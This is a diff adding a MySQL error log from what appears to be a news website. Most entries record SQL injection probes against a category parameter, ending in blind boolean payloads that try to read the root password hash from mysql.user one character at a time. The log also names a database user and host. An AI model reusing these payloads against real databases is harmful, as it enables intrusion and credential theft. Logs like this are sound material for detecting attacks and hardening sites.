@@ -1,0 +1,95 @@
+Time : 08:12:09
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE opinion SET `visitas` = `visitas`+1 WHERE id=
+
+Time : 04:54:10
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'chhoy'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and ascii(substr((SELECT CONCAT(user, ' ',authentication_string) FROM mysql.user where user like 'root' LIMIT 0,1),1,1))>0 and '21'='21' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:10
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'chhoy'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and ascii(substr((SELECT CONCAT(user, ' ',authentication_string) FROM mysql.user where user like 'root' LIMIT 0,1),1,1))>1 and '21'='21' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:09
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'chhoy'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and ascii(substr((SELECT CONCAT(user, ' ',authentication_string) FROM mysql.user where user like 'root' LIMIT 0,1),1,1))>3 and '21'='21' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:09
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'chhoy'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and ascii(substr((SELECT CONCAT(user, ' ',authentication_string) FROM mysql.user where user like 'root' LIMIT 0,1),1,1))>7 and '21'='21' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:09
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'chhoy'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and ascii(substr((SELECT CONCAT(user, ' ',authentication_string) FROM mysql.user where user like 'root' LIMIT 0,1),1,1))>15 and '21'='21' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:08
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'chhoy'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and ascii(substr((SELECT CONCAT(user, ' ',authentication_string) FROM mysql.user where user like 'root' LIMIT 0,1),1,1))>31 and '21'='21' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:08
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'chhoy'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and ascii(substr((SELECT CONCAT(user, ' ',authentication_string) FROM mysql.user where user like 'root' LIMIT 0,1),1,1))>63 and '21'='21' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:07
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY date DESC LIMIT 119,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and NoVale' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:05
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"QnoVale' ORDER BY date DESC LIMIT 119,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno,'"QnoVale' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:02
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'chhoy'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and ascii(substr((SELECT CONCAT(user, ' ',password) FROM mysql.user where user like 'root' LIMIT 0,1),1,1))>0 and '21'='21' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:02
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'chhoy'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and ascii(substr((SELECT CONCAT(user, ' ',password) FROM mysql.user where user like 'root' LIMIT 0,1),1,1))>1 and '21'='21' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:01
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'chhoy'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and ascii(substr((SELECT CONCAT(user, ' ',password) FROM mysql.user where user like 'root' LIMIT 0,1),1,1))>3 and '21'='21' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:01
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'chhoy'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and ascii(substr((SELECT CONCAT(user, ' ',password) FROM mysql.user where user like 'root' LIMIT 0,1),1,1))>7 and '21'='21' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:01
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'chhoy'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and ascii(substr((SELECT CONCAT(user, ' ',password) FROM mysql.user where user like 'root' LIMIT 0,1),1,1))>15 and '21'='21' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:00
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'chhoy'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and ascii(substr((SELECT CONCAT(user, ' ',password) FROM mysql.user where user like 'root' LIMIT 0,1),1,1))>31 and '21'='21' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:54:00
+SQLSTATE[42000]: Syntax error or access violation: 1142 SELECT command denied to user 'chhoy'@'ps447048.dreamhost.com' for table 'user'
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and ascii(substr((SELECT CONCAT(user, ' ',password) FROM mysql.user where user like 'root' LIMIT 0,1),1,1))>63 and '21'='21' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:53:59
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY date DESC LIMIT 119,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and NoVale' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:53:57
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"QnoVale' ORDER BY date DESC LIMIT 119,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno,'"QnoVale' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:52:49
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY date DESC LIMIT 119,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and NoVale' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:52:47
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"QnoVale' ORDER BY date DESC LIMIT 119,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno,'"QnoVale' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:52:45
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY date DESC LIMIT 119,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno' and NoVale' ORDER BY date DESC LIMIT 119,7
+
+Time : 04:52:43
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"QnoVale' ORDER BY date DESC LIMIT 119,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'gobierno,'"QnoVale' ORDER BY date DESC LIMIT 119,7
+
+Time : 03:17:42
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=
